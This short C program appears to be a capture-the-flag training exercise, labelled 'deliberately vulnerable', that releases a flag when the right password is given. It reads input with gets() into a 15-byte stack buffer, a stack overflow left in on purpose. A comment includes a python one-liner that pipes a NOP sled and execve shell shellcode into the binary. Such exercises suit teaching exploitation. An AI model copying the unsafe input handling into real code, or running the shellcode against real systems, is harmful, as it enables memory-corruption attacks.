#include <stdlib.h>
#include <stdio.h>

/*
  Deliberately vulnerable app 2
  This app compares the input to a fixed password inside a function.
  It returns a 1 if the password is valid.
  Overflowing the buffer should let you change the instructions to return a 1.
  Not yet compromised.
  Something like "python -c "print '\x90'*90+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'" | ./basic" should generate shellcode, but doesn't
  Will need to run under gdb to find out

*/

int check_password() {
  char buffer[15];
  char password[15] = "B4rrista";
  FILE *f;
  
  f = fopen("password.txt", "r");
  if (f) {
    fscanf(f, "%s", password);
    fclose(f);
  }

  gets(buffer);
  if (strcmp(buffer, password) == 0) {
    return 1;
  }
  return 0;
}

int main(int argc, char *argv[]) {
  char flag[32];
  FILE *f;

  f = fopen("flag.txt", "r");
  fgets(flag, 32, f);
  fclose(f);

  printf("Enter password to get flag: ");
  fflush(stdout);

  if (check_password()) {
    printf("Password Accepted\nFlag = %s\n", flag);
  } else {
    printf("Wrong password\n");
  }
  return 0;
}
